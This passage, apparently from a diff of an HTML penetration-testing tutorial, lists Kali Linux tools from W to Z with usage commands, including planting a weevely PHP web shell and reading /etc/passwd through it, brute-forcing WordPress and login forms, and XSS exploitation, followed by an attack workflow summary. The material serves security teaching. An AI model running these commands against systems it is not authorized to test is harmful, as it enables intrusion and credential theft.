+# - Cron jobs
+# - Kernel exploits
+
+# ========== VOLATILITY ==========
+# Category: Forensics
+# Purpose: Memory analysis
+# See Section 1 for detailed guide
+
+sudo apt install volatility3
+
+# Identify profile:
+vol.py -f memory.dump windows.info
+
+# List processes:
+vol.py -f memory.dump windows.pslist
+
+# Dump process:
+vol.py -f memory.dump windows.dumpfiles --pid 1234</div>
+
+            <h3>W-X-Y-Z-Tools</h3>
+
+            <div class=\"code\"># ========== WAFW00F ==========
+# Category: Web Application Analysis
+# Purpose: WAF (Web Application Firewall) detection
+
+sudo apt install wafw00f
+
+# Detect WAF:
+wafw00f http://target.com
+
+# Output:
+# [*] The site http://target.com is behind Cloudflare (Cloudflare Inc.) WAF
+
+# ========== WEEVELY ==========
+# Category: Post Exploitation
+# Purpose: Stealth PHP web shell
+
+sudo apt install weevely
+
+# Generate shell:
+weevely generate password shell.php
+
+# Upload shell.php to target
+
+# Connect:
+weevely http://target.com/shell.php password
+
+# Commands:
+weevely> :system.info          # System information
+weevely> :file.download /etc/passwd local.txt
+weevely> :audit.etcpasswd      # Check for weak passwords
+weevely> :sql.console          # SQL shell
+
+# ========== WHATWEB ==========
+# Category: Information Gathering
+# Purpose: Website fingerprinting
+
+sudo apt install whatweb
+
+# Basic:
+whatweb target.com
+
+# Verbose:
+whatweb -v target.com
+
+# Output shows:
+# - CMS (WordPress, Joomla, etc.)
+# - Web server
+# - Programming language
+# - JavaScript libraries
+# - Analytics
+# - CDN
+
+# ========== WFUZZ ==========
+# Category: Web Application Analysis
+# Purpose: Web application fuzzer
+
+sudo apt install wfuzz
+
+# Fuzz parameter:
+wfuzz -w wordlist.txt http://target.com/page.php?id=FUZZ
+
+# Fuzz directory:
+wfuzz -w wordlist.txt http://target.com/FUZZ
+
+# POST:
+wfuzz -w wordlist.txt -d \"user=admin&pass=FUZZ\" http://target.com/login.php
+
+# Hide responses by size:
+wfuzz -w wordlist.txt --hh 1234 http://target.com/FUZZ
+
+# Hide by code:
+wfuzz -w wordlist.txt --hc 404 http://target.com/FUZZ
+
+# ========== WIRESHARK ==========
+# Category: Sniffing & Spoofing
+# Purpose: Packet analysis (GUI)
+# See Bonus Part 1 for detailed guide
+
+sudo apt install wireshark
+
+# Launch:
+sudo wireshark
+
+# Capture:
+# 1. Select interface (eth0)
+# 2. Start capture
+# 3. Apply filters (http, tcp.port == 80, etc.)
+# 4. Follow TCP stream (right-click packet)
+# 5. Extract objects (File → Export Objects → HTTP)
+
+# ========== WPSCAN ==========
+# Category: Web Application Analysis
+# Purpose: WordPress vulnerability scanner
+
+sudo apt install wpscan
+
+# Basic scan:
+wpscan --url http://target.com
+
+# Enumerate users:
+wpscan --url http://target.com --enumerate u
+
+# Enumerate plugins:
+wpscan --url http://target.com --enumerate p
+
+# Enumerate themes:
+wpscan --url http://target.com --enumerate t
+
+# Brute force:
+wpscan --url http://target.com --usernames admin --passwords rockyou.txt
+
+# API token (for vulnerability data):
+wpscan --url http://target.com --api-token YOUR_TOKEN
+
+# ========== XSSTRIKE ==========
+# Category: Web Application Analysis
+# Purpose: XSS scanner and exploitation
+
+git clone https://github.com/s0md3v/XSStrike.git
+cd XSStrike
+pip3 install -r requirements.txt
+
+# Scan:
+python3 xsstrike.py -u \"http://target.com/page.php?q=test\"
+
+# Crawl entire site:
+python3 xsstrike.py -u \"http://target.com\" --crawl
+
+# Features:
+# - Context analysis
+# - WAF detection
+# - Payload generation
+# - DOM XSS detection
+
+# ========== YARA ==========
+# Category: Forensics / Malware Analysis
+# Purpose: Pattern matching for malware identification
+
+sudo apt install yara
+
+# Create rule (malware.yar):
+rule ExampleMalware
+{
+    strings:
+        $a = \"malicious_string\"
+        $b = { 6A 40 68 00 30 00 00 }  # Hex pattern
+    condition:
+        $a or $b
+}
+
+# Scan:
+yara malware.yar /path/to/files
+
+# Recursive:
+yara -r malware.yar /path/to/directory
+
+# ========== ZAPROXY ==========
+# See OWASP ZAP above
+
+# ========== ZENMAP ==========
+# Category: Information Gathering
+# Purpose: Nmap GUI
+
+sudo apt install zenmap
+
+# Launch:
+sudo zenmap
+
+# Features:
+# - Visual network topology
+# - Profile editor (save scan configs)
+# - Compare scans
+# - Search results
+# - OS detection visualization
+
+# ========== ZMAP ==========
+# Category: Information Gathering
+# Purpose: Internet-scale scanner (scan entire IPv4 in 45 minutes!)
+
+sudo apt install zmap
+
+# Scan Internet for web servers:
+sudo zmap -p 80
+
+# Specific network:
+sudo zmap -p 443 10.0.0.0/8
+
+# Output to file:
+sudo zmap -p 22 -o results.txt
+
+# Rate limit:
+sudo zmap -p 80 -B 10M  # 10 Mbps
+
+# Blocklist:
+sudo zmap -p 80 -b blocklist.txt</div>
+
+            <div class=\"metaphor-box\">
+                <h4>🎉 You're a Kali Tools Encyclopedia!</h4>
+                <p>You've mastered 100+ tools across ALL categories:<br><br>
+                ✅ <strong>Information Gathering:</strong> nmap, amass, recon-ng, Shodan, theHarvester<br>
+                ✅ <strong>Web App Analysis:</strong> Burp Suite, SQLmap, nikto, wpscan, gobuster, wfuzz<br>
+                ✅ <strong>Wireless:</strong> aircrack-ng, kismet, reaver, wifiphisher<br>
+                ✅ <strong>Password Attacks:</strong> hashcat, john, hydra, crunch<br>
+                ✅ <strong>Exploitation:</strong> Metasploit, exploitdb, impacket, BeEF<br>
+                ✅ <strong>Post-Exploitation:</strong> chisel, crackmapexec, mimikatz, responder<br>
+                ✅ <strong>Sniffing/Spoofing:</strong> Wireshark, tcpdump, bettercap, ettercap<br>
+                ✅ <strong>Reverse Engineering:</strong> radare2, ghidra, Binary Ninja<br>
+                ✅ <strong>Forensics:</strong> volatility, autopsy, binwalk, foremost<br>
+                ✅ <strong>Social Engineering:</strong> SET, gophish<br><br>
+                <strong>Tool selection workflow:</strong><br>
+                1. <strong>Recon phase:</strong> nmap → enum4linux → theHarvester → Google dorking<br>
+                2. <strong>Vulnerability discovery:</strong> nikto → SQLmap → Burp Suite<br>
+                3. <strong>Exploitation:</strong> Metasploit → exploit-db → custom exploits<br>
+                4. <strong>Post-exploitation:</strong> mimikatz → bloodhound → crackmapexec<br>
+                5. <strong>Persistence:</strong> weevely → empire → custom C2<br><br>
+                <strong>Quick reference cheat sheets:</strong><br>
+                • <code>/usr/share/</code> - Default wordlists, scripts, tools<br>
+                • <code>man [tool]</code> or <code>[tool] -h</code> - Help for any tool<br>
+                • <strong>HackTricks:</strong> https://book.hacktricks.xyz (ultimate knowledge base)<br>
+                • <strong>GTFOBins:</strong> https://gtfobins.github.io (Unix binary exploitation)<br>
+                • <strong>LOLBAS:</strong> https://lolbas-project.github.io (Windows living off the land)<br>
+                • <strong>PayloadsAllTheThings:</strong> https://github.com/swisskyrepo/PayloadsAllTheThings<br><br>
+                <strong>Pro tips:</strong><br>
+                • Always check <code>-h</code> flag first<br>
+                • Read manual pages: <code>man nmap</code><br>
+                • Practice in labs (HTB, TryHackMe) before real engagements<br>
+                • Update tools regularly: <code>sudo apt update && sudo apt upgrade</code><br>
+                • Keep notes in CherryTree or Obsidian for quick reference<br><br>
+                You now have the most comprehensive Kali tools dictionary. Reference this during CTFs, exams, and real-world pentests! 🛠️🔥</p>
+            </div>
         </section>
 
     </main>
